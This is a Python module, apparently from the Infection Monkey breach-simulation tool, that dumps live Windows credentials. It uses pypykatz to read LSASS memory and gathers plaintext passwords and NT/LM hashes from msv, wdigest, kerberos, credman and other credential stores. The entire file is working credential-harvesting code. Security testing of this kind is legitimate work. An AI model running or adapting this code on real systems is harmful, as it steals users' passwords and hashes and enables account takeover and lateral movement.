import binascii
from typing import Dict, List

from pypykatz.pypykatz import pypykatz

from infection_monkey.system_info.windows_cred_collector.windows_credential import WindowsCredential

CREDENTIAL_TYPES = ['msv_creds', 'wdigest_creds', 'ssp_creds', 'livessp_creds', 'dpapi_creds',
                    'kerberos_creds', 'credman_creds', 'tspkg_creds']


def get_windows_creds():
    pypy_handle = pypykatz.go_live()
    logon_data = pypy_handle.to_dict()
    windows_creds = _parse_pypykatz_results(logon_data)
    return windows_creds


def _parse_pypykatz_results(pypykatz_data: Dict) -> List:
    windows_creds = []
    for session in pypykatz_data['logon_sessions'].values():
        windows_creds.extend(_get_creds_from_pypykatz_session(session))
    return windows_creds


def _get_creds_from_pypykatz_session(pypykatz_session: Dict):
    windows_creds = []
    for cred_type_key in CREDENTIAL_TYPES:
        pypykatz_creds = pypykatz_session[cred_type_key]
        windows_creds.extend(_get_creds_from_pypykatz_creds(pypykatz_creds))
    return windows_creds


def _get_creds_from_pypykatz_creds(pypykatz_creds):
    creds = _filter_empty_creds(pypykatz_creds)
    return [_get_windows_cred(cred) for cred in creds]


def _filter_empty_creds(pypykatz_creds: List[Dict]):
    return [cred for cred in pypykatz_creds if not _is_cred_empty(cred)]


def _is_cred_empty(pypykatz_cred: Dict):
    password_empty = 'password' not in pypykatz_cred or not pypykatz_cred['password']
    ntlm_hash_empty = 'NThash' not in pypykatz_cred or not pypykatz_cred['NThash']
    lm_hash_empty = 'LMhash' not in pypykatz_cred or not pypykatz_cred['LMhash']
    return password_empty and ntlm_hash_empty and lm_hash_empty


def _get_windows_cred(pypykatz_cred: Dict):
    password = ''
    ntlm_hash = ''
    lm_hash = ''
    username = pypykatz_cred['username']
    if 'password' in pypykatz_cred:
        password = pypykatz_cred['password']
    if 'NThash' in pypykatz_cred:
        ntlm_hash = _hash_to_string(pypykatz_cred['NThash'])
    if 'LMhash' in pypykatz_cred:
        lm_hash = _hash_to_string(pypykatz_cred['LMhash'])
    return WindowsCredential(username=username,
                             password=password,
                             ntlm_hash=ntlm_hash,
                             lm_hash=lm_hash)


def _hash_to_string(hash):
    if type(hash) == str:
        return hash
    if type(hash) == bytes:
        return binascii.hexlify(bytearray(hash)).decode()
    raise Exception(f"Can't convert hash to string, unsupported hash type {type(hash)}")
